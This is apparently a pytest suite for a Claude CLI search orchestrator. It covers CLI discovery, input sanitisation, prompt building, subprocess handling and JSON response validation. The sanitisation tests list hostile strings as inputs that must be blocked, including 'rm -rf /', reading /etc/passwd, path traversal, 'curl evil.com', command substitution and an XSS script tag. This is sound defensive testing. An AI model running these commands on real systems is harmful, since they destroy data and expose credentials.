"""
Unit tests for Claude CLI orchestrator.

Tests security, subprocess management, JSON validation, and orchestration logic.
"""

import asyncio
import json
import pytest
import subprocess
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Dict, Any

from claude_code_context.mcp_server.orchestrator import (
    ClaudeOrchestrator,
    ClaudeStrategyResponse,
    OrchestrationContext,
    SearchType,
    SecurityError,
)
from claude_code_context.mcp_server.models import MCPServerConfig


class TestClaudeOrchestrator:
    """Test the ClaudeOrchestrator class"""
    
    @pytest.fixture
    def config(self):
        """Create test configuration"""
        return MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334",
            max_claude_calls=5,
            debug_mode=True
        )
    
    @pytest.fixture
    def orchestrator(self, config):
        """Create orchestrator with mocked Claude CLI"""
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    def test_init_with_available_cli(self, config):
        """Test initialization when Claude CLI is available"""
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            orchestrator = ClaudeOrchestrator(config)
            
            assert orchestrator.claude_cli_path == '/usr/bin/claude'
            assert orchestrator.max_claude_calls == 5
            assert orchestrator.debug_mode is True
            assert orchestrator.max_query_length == 1000
            assert orchestrator.timeout_seconds == 30
    
    def test_init_without_cli(self, config):
        """Test initialization when Claude CLI is not available"""
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value=None):
            orchestrator = ClaudeOrchestrator(config)
            
            assert orchestrator.claude_cli_path is None
            assert not orchestrator.is_available()
    
    def test_find_claude_cli_success(self, config):
        """Test finding Claude CLI successfully"""
        with patch('shutil.which', return_value='/usr/bin/claude'):
            with patch('os.access', return_value=True):
                orchestrator = ClaudeOrchestrator(config)
                assert orchestrator.claude_cli_path == '/usr/bin/claude'
    
    def test_find_claude_cli_not_found(self, config):
        """Test Claude CLI not found"""
        with patch('shutil.which', return_value=None):
            orchestrator = ClaudeOrchestrator(config)
            assert orchestrator.claude_cli_path is None
    
    def test_find_claude_cli_not_executable(self, config):
        """Test Claude CLI found but not executable"""
        with patch('shutil.which', return_value='/usr/bin/claude'):
            with patch('os.access', return_value=False):
                orchestrator = ClaudeOrchestrator(config)
                assert orchestrator.claude_cli_path is None


class TestInputSanitization:
    """Test input sanitization and security measures"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator for testing"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    def test_sanitize_input_valid(self, orchestrator):
        """Test sanitization of valid input"""
        valid_inputs = [
            "find authentication functions",
            "show me user login code",
            "Python JWT validation examples",
            "async database operations with error handling",
        ]
        
        for input_text in valid_inputs:
            result = orchestrator._sanitize_input(input_text)
            assert isinstance(result, str)
            assert len(result) > 0
    
    def test_sanitize_input_dangerous_patterns(self, orchestrator):
        """Test sanitization blocks dangerous patterns"""
        dangerous_inputs = [
            "find auth; rm -rf /",  # Shell command injection
            "show me users | cat /etc/passwd",  # Pipe injection
            "search ../../../etc/passwd",  # Path traversal
            "find auth && curl evil.com",  # Command chaining
            "search `whoami`",  # Command substitution
            "find $USER files",  # Variable expansion
            "<script>alert('xss')</script>",  # HTML injection
            "exec('os.system(\"rm -rf /\")')",  # Code execution
            "eval('malicious_code')",  # Code evaluation
            "import os; os.system('rm -rf /')",  # OS imports
            "subprocess.call(['rm', '-rf', '/'])",  # Subprocess calls
        ]
        
        for dangerous_input in dangerous_inputs:
            with pytest.raises(SecurityError):
                orchestrator._sanitize_input(dangerous_input)
    
    def test_sanitize_input_length_limit(self, orchestrator):
        """Test input length limits"""
        # Test at limit
        max_length_input = "a" * orchestrator.max_query_length
        result = orchestrator._sanitize_input(max_length_input)
        assert len(result) == orchestrator.max_query_length
        
        # Test over limit
        over_limit_input = "a" * (orchestrator.max_query_length + 1)
        with pytest.raises(SecurityError, match="Input too long"):
            orchestrator._sanitize_input(over_limit_input)
    
    def test_sanitize_input_non_string(self, orchestrator):
        """Test non-string input rejection"""
        non_string_inputs = [123, [], {}, None, True]
        
        for non_string in non_string_inputs:
            with pytest.raises(SecurityError, match="Input must be a string"):
                orchestrator._sanitize_input(non_string)
    
    def test_sanitize_input_control_characters(self, orchestrator):
        """Test removal of control characters"""
        input_with_controls = "find auth\x00\x01\x0B\x0C\x0E functions"
        result = orchestrator._sanitize_input(input_with_controls)
        assert "\x00" not in result
        assert "\x01" not in result
        assert result == "find auth functions"
    
    def test_sanitize_input_whitespace_normalization(self, orchestrator):
        """Test whitespace normalization"""
        messy_input = "  find   authentication    functions  \t\n  "
        result = orchestrator._sanitize_input(messy_input)
        assert result == "find authentication functions"


class TestPromptBuilding:
    """Test prompt building and context handling"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator for testing"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    def test_build_prompt_basic(self, orchestrator):
        """Test basic prompt building"""
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find authentication functions",
            iteration=1,
            max_iterations=3
        )
        
        prompt = orchestrator._build_prompt(context)
        
        assert "find authentication functions" in prompt
        assert "Iteration: 1/3" in prompt
        assert "JSON response" in prompt
        assert "search_type" in prompt
        assert "payload" in prompt and "semantic" in prompt and "hybrid" in prompt
    
    def test_build_prompt_with_context(self, orchestrator):
        """Test prompt building with project context"""
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find JWT validation",
            iteration=2,
            project_context="This is a FastAPI project with user authentication"
        )
        
        prompt = orchestrator._build_prompt(context)
        
        assert "find JWT validation" in prompt
        assert "FastAPI project" in prompt
        assert "Project context:" in prompt
    
    def test_build_prompt_with_long_context(self, orchestrator):
        """Test prompt building truncates long context"""
        long_context = "x" * 1000  # Long context
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find functions",
            project_context=long_context
        )
        
        prompt = orchestrator._build_prompt(context)
        
        # Should be truncated with ellipsis
        assert "..." in prompt
        assert len(prompt) < len(long_context) + 500
    
    def test_build_prompt_with_search_history(self, orchestrator):
        """Test prompt building with search history"""
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find password hashing",
            search_history=["auth functions", "user login", "JWT tokens", "bcrypt"]
        )
        
        prompt = orchestrator._build_prompt(context)
        
        assert "Previous searches:" in prompt
        # Should only include last 3
        assert "user login" in prompt
        assert "JWT tokens" in prompt
        assert "bcrypt" in prompt
        assert "auth functions" not in prompt  # Should be excluded (oldest)
    
    def test_build_prompt_length_limit(self, orchestrator):
        """Test prompt length limit enforcement"""
        # Temporarily reduce the max_context_length to make the test feasible
        original_limit = orchestrator.max_context_length
        orchestrator.max_context_length = 500  # Set very low limit
        
        try:
            # Now even a normal prompt should exceed the limit
            context = OrchestrationContext(
                project_path=Path("/test/project"),
                query="find authentication functions and user management code",
                project_context="This is a FastAPI project with authentication",
                search_history=["previous search", "another search", "third search"]
            )
            
            with pytest.raises(SecurityError, match="Prompt too long"):
                orchestrator._build_prompt(context)
        finally:
            # Restore original limit
            orchestrator.max_context_length = original_limit


class TestClaudeCliExecution:
    """Test Claude CLI subprocess execution"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator for testing"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    @pytest.mark.asyncio
    async def test_execute_claude_cli_success(self, orchestrator):
        """Test successful Claude CLI execution"""
        mock_response = {
            "search_type": "semantic",
            "query": "authentication functions",
            "reasoning": "User is looking for auth code",
            "focus_areas": ["security", "auth"],
            "iterations_remaining": 0
        }
        
        mock_process = AsyncMock()
        mock_process.returncode = 0
        mock_process.communicate.return_value = (
            json.dumps(mock_response).encode('utf-8'),
            b''
        )
        
        with patch('asyncio.create_subprocess_exec', return_value=mock_process):
            with patch('asyncio.wait_for', return_value=(mock_process.communicate.return_value)):
                result = await orchestrator._execute_claude_cli("test prompt")
                
                assert result == mock_response
    
    @pytest.mark.asyncio
    async def test_execute_claude_cli_not_available(self):
        """Test Claude CLI execution when not available"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value=None):
            orchestrator = ClaudeOrchestrator(config)
            
            with pytest.raises(RuntimeError, match="Claude CLI not available"):
                await orchestrator._execute_claude_cli("test prompt")
    
    @pytest.mark.asyncio
    async def test_execute_claude_cli_timeout(self, orchestrator):
        """Test Claude CLI execution timeout"""
        with patch('asyncio.create_subprocess_exec'):
            with patch('asyncio.wait_for', side_effect=asyncio.TimeoutError()):
                with pytest.raises(subprocess.TimeoutExpired):
                    await orchestrator._execute_claude_cli("test prompt")
    
    @pytest.mark.asyncio
    async def test_execute_claude_cli_error_code(self, orchestrator):
        """Test Claude CLI execution with error return code"""
        mock_process = AsyncMock()
        mock_process.returncode = 1
        mock_process.communicate.return_value = (b'', b'Error message')
        
        with patch('asyncio.create_subprocess_exec', return_value=mock_process):
            with patch('asyncio.wait_for', return_value=(mock_process.communicate.return_value)):
                with pytest.raises(RuntimeError, match="Claude CLI error"):
                    await orchestrator._execute_claude_cli("test prompt")
    
    @pytest.mark.asyncio
    async def test_execute_claude_cli_invalid_json(self, orchestrator):
        """Test Claude CLI execution with invalid JSON response"""
        mock_process = AsyncMock()
        mock_process.returncode = 0
        mock_process.communicate.return_value = (b'Not JSON response', b'')
        
        with patch('asyncio.create_subprocess_exec', return_value=mock_process):
            with patch('asyncio.wait_for', return_value=(mock_process.communicate.return_value)):
                with pytest.raises(json.JSONDecodeError):
                    await orchestrator._execute_claude_cli("test prompt")
    
    @pytest.mark.asyncio
    async def test_execute_claude_cli_json_extraction(self, orchestrator):
        """Test JSON extraction from Claude response with extra text"""
        mock_response = {
            "search_type": "payload",
            "query": "user login",
            "reasoning": "Direct search needed",
            "focus_areas": ["auth"],
            "iterations_remaining": 1
        }
        
        # Response with extra text around JSON
        response_text = f"""
        Here's my analysis:
        
        {json.dumps(mock_response)}
        
        Let me know if you need more details.
        """
        
        mock_process = AsyncMock()
        mock_process.returncode = 0
        mock_process.communicate.return_value = (response_text.encode('utf-8'), b'')
        
        with patch('asyncio.create_subprocess_exec', return_value=mock_process):
            with patch('asyncio.wait_for', return_value=(mock_process.communicate.return_value)):
                result = await orchestrator._execute_claude_cli("test prompt")
                
                assert result == mock_response


class TestResponseValidation:
    """Test Claude response validation"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator for testing"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    def test_validate_response_success(self, orchestrator):
        """Test successful response validation"""
        valid_responses = [
            {
                "search_type": "payload",
                "query": "authentication functions",
                "reasoning": "Looking for specific auth functions",
                "focus_areas": ["security"],
                "iterations_remaining": 0
            },
            {
                "search_type": "semantic",
                "query": "how to implement JWT validation",
                "reasoning": "User needs implementation guidance",
                "focus_areas": ["authentication", "security", "JWT"],
                "iterations_remaining": 2
            },
            {
                "search_type": "hybrid",
                "query": "database connection pooling",
                "reasoning": "Complex query needs both approaches",
                "focus_areas": [],
                "iterations_remaining": 1
            }
        ]
        
        for response_data in valid_responses:
            result = orchestrator._validate_response(response_data)
            assert isinstance(result, ClaudeStrategyResponse)
            assert result.search_type in [SearchType.PAYLOAD, SearchType.SEMANTIC, SearchType.HYBRID]
            assert len(result.query) > 0
            assert len(result.reasoning) > 0
    
    def test_validate_response_invalid_search_type(self, orchestrator):
        """Test validation with invalid search type"""
        invalid_response = {
            "search_type": "invalid_type",
            "query": "test query",
            "reasoning": "test reasoning",
            "focus_areas": [],
            "iterations_remaining": 0
        }
        
        with pytest.raises(Exception):  # ValidationError from Pydantic
            orchestrator._validate_response(invalid_response)
    
    def test_validate_response_missing_fields(self, orchestrator):
        """Test validation with missing required fields"""
        incomplete_responses = [
            {"search_type": "payload"},  # Missing other fields
            {"query": "test"},  # Missing search_type
            {"search_type": "semantic", "query": ""},  # Empty query
        ]
        
        for response_data in incomplete_responses:
            with pytest.raises(Exception):  # ValidationError from Pydantic
                orchestrator._validate_response(response_data)
    
    def test_validate_response_dangerous_content(self, orchestrator):
        """Test validation blocks dangerous content"""
        dangerous_response = {
            "search_type": "payload",
            "query": "find auth; rm -rf /",  # Dangerous query
            "reasoning": "test reasoning",
            "focus_areas": [],
            "iterations_remaining": 0
        }
        
        with pytest.raises(SecurityError):
            orchestrator._validate_response(dangerous_response)
    
    def test_validate_response_length_limits(self, orchestrator):
        """Test validation enforces length limits"""
        # Query too long
        long_query_response = {
            "search_type": "payload",
            "query": "a" * 1001,  # Over limit
            "reasoning": "test reasoning",
            "focus_areas": [],
            "iterations_remaining": 0
        }
        
        with pytest.raises(Exception):  # ValidationError from Pydantic
            orchestrator._validate_response(long_query_response)
        
        # Reasoning too long
        long_reasoning_response = {
            "search_type": "payload",
            "query": "test query",
            "reasoning": "a" * 2001,  # Over limit
            "focus_areas": [],
            "iterations_remaining": 0
        }
        
        with pytest.raises(Exception):  # ValidationError from Pydantic
            orchestrator._validate_response(long_reasoning_response)
    
    def test_validate_response_focus_areas_limits(self, orchestrator):
        """Test validation enforces focus areas limits"""
        too_many_areas_response = {
            "search_type": "payload",
            "query": "test query",
            "reasoning": "test reasoning",
            "focus_areas": [f"area{i}" for i in range(11)],  # Over limit of 10
            "iterations_remaining": 0
        }
        
        with pytest.raises(Exception):  # ValidationError from Pydantic
            orchestrator._validate_response(too_many_areas_response)


class TestFallbackStrategy:
    """Test fallback strategy when Claude CLI is unavailable"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator without Claude CLI"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value=None):
            return ClaudeOrchestrator(config)
    
    def test_fallback_strategy_payload(self, orchestrator):
        """Test fallback strategy chooses payload for simple queries"""
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="getUserById",
            iteration=1
        )
        
        result = orchestrator._fallback_strategy(context)
        
        assert result.search_type == SearchType.PAYLOAD
        assert result.query == "getUserById"
        assert "Fallback strategy" in result.reasoning
        assert result.iterations_remaining == 0
    
    def test_fallback_strategy_semantic(self, orchestrator):
        """Test fallback strategy chooses semantic for conceptual queries"""
        conceptual_queries = [
            "how to implement authentication",
            "explain JWT token validation",
            "what is the pattern for error handling",
            "show me examples of async functions",
        ]
        
        for query in conceptual_queries:
            context = OrchestrationContext(
                project_path=Path("/test/project"),
                query=query,
                iteration=1
            )
            
            result = orchestrator._fallback_strategy(context)
            assert result.search_type == SearchType.SEMANTIC
    
    def test_fallback_strategy_hybrid(self, orchestrator):
        """Test fallback strategy chooses hybrid for complex queries"""
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find database connection functions with error handling",
            iteration=1
        )
        
        result = orchestrator._fallback_strategy(context)
        
        assert result.search_type == SearchType.HYBRID
        assert result.query == "find database connection functions with error handling"


class TestOrchestrationWorkflows:
    """Test complete orchestration workflows"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator for testing"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334",
            max_claude_calls=3
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    @pytest.mark.asyncio
    async def test_analyze_query_success(self, orchestrator):
        """Test successful query analysis"""
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find authentication functions",
            iteration=1
        )
        
        mock_response = {
            "search_type": "hybrid",
            "query": "authentication login logout functions",
            "reasoning": "Need both specific and conceptual search",
            "focus_areas": ["auth", "security"],
            "iterations_remaining": 1
        }
        
        with patch.object(orchestrator, '_execute_claude_cli', return_value=mock_response):
            result = await orchestrator.analyze_query(context)
            
            assert isinstance(result, ClaudeStrategyResponse)
            assert result.search_type == SearchType.HYBRID
            assert result.query == "authentication login logout functions"
    
    @pytest.mark.asyncio
    async def test_analyze_query_fallback(self, orchestrator):
        """Test query analysis falls back on error"""
        orchestrator.debug_mode = False  # Enable graceful fallback
        
        context = OrchestrationContext(
            project_path=Path("/test/project"),
            query="find user functions",
            iteration=1
        )
        
        with patch.object(orchestrator, '_execute_claude_cli', new_callable=AsyncMock, side_effect=Exception("CLI error")):
            result = await orchestrator.analyze_query(context)
            
            # Should get fallback strategy
            assert isinstance(result, ClaudeStrategyResponse)
            assert "Fallback strategy" in result.reasoning
    
    @pytest.mark.asyncio
    async def test_iterative_search_single_iteration(self, orchestrator):
        """Test iterative search with single iteration"""
        mock_response = {
            "search_type": "payload",
            "query": "user login function",
            "reasoning": "Direct search for login function",
            "focus_areas": ["auth"],
            "iterations_remaining": 0  # Should stop after first iteration
        }
        
        with patch.object(orchestrator, '_execute_claude_cli', return_value=mock_response):
            results = await orchestrator.iterative_search("find login")
            
            assert len(results) == 1
            assert results[0].query == "user login function"
    
    @pytest.mark.asyncio
    async def test_iterative_search_multiple_iterations(self, orchestrator):
        """Test iterative search with multiple iterations"""
        responses = [
            {
                "search_type": "semantic",
                "query": "authentication system overview",
                "reasoning": "First, understand the auth system",
                "focus_areas": ["auth"],
                "iterations_remaining": 2
            },
            {
                "search_type": "payload",
                "query": "login validate_password hash",
                "reasoning": "Now find specific functions",
                "focus_areas": ["auth", "validation"],
                "iterations_remaining": 1
            },
            {
                "search_type": "hybrid",
                "query": "session management JWT tokens",
                "reasoning": "Finally check session handling",
                "focus_areas": ["sessions"],
                "iterations_remaining": 0
            }
        ]
        
        with patch.object(orchestrator, '_execute_claude_cli', side_effect=responses):
            results = await orchestrator.iterative_search("find authentication")
            
            assert len(results) == 3
            assert results[0].search_type == SearchType.SEMANTIC
            assert results[1].search_type == SearchType.PAYLOAD
            assert results[2].search_type == SearchType.HYBRID
    
    @pytest.mark.asyncio
    async def test_iterative_search_with_context(self, orchestrator):
        """Test iterative search with project context"""
        mock_response = {
            "search_type": "semantic",
            "query": "FastAPI authentication middleware",
            "reasoning": "FastAPI project needs middleware approach",
            "focus_areas": ["fastapi", "middleware"],
            "iterations_remaining": 0
        }
        
        with patch.object(orchestrator, '_execute_claude_cli', return_value=mock_response):
            results = await orchestrator.iterative_search(
                "find auth",
                project_context="This is a FastAPI web application"
            )
            
            assert len(results) == 1
            assert "FastAPI" in results[0].query


class TestHealthCheck:
    """Test orchestrator health check functionality"""
    
    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator for testing"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value='/usr/bin/claude'):
            return ClaudeOrchestrator(config)
    
    @pytest.mark.asyncio
    async def test_health_check_success(self, orchestrator):
        """Test successful health check"""
        mock_response = {
            "search_type": "payload",
            "query": "test query",
            "reasoning": "Health check",
            "focus_areas": [],
            "iterations_remaining": 0
        }
        
        with patch.object(orchestrator, '_execute_claude_cli', return_value=mock_response):
            status = await orchestrator.health_check()
            
            assert status["claude_cli_available"] is True
            assert status["claude_cli_path"] == '/usr/bin/claude'
            assert status["health_check_passed"] is True
            assert "response_time_seconds" in status
    
    @pytest.mark.asyncio
    async def test_health_check_failure(self, orchestrator):
        """Test health check with CLI failure that propagates"""
        with patch.object(orchestrator, 'analyze_query', side_effect=Exception("CLI error")):
            status = await orchestrator.health_check()
            
            assert status["claude_cli_available"] is True
            assert status["health_check_passed"] is False
            assert status["error"] == "CLI error"
    
    @pytest.mark.asyncio
    async def test_health_check_cli_error_with_fallback(self, orchestrator):
        """Test health check with CLI error but successful fallback"""
        # Set debug mode to False so analyze_query uses fallback instead of raising
        orchestrator.debug_mode = False
        
        with patch.object(orchestrator, '_execute_claude_cli', side_effect=Exception("CLI error")):
            status = await orchestrator.health_check()
            
            assert status["claude_cli_available"] is True
            assert status["health_check_passed"] is True  # Should succeed with fallback
            assert "response_time_seconds" in status
    
    @pytest.mark.asyncio
    async def test_health_check_cli_unavailable(self):
        """Test health check when CLI is unavailable"""
        config = MCPServerConfig(
            project_path=Path("/test/project"),
            collection_name="test_collection",
            qdrant_url="http://localhost:6334"
        )
        with patch.object(ClaudeOrchestrator, '_find_claude_cli', return_value=None):
            orchestrator = ClaudeOrchestrator(config)
            status = await orchestrator.health_check()
            
            assert status["claude_cli_available"] is False
            assert status["claude_cli_path"] is None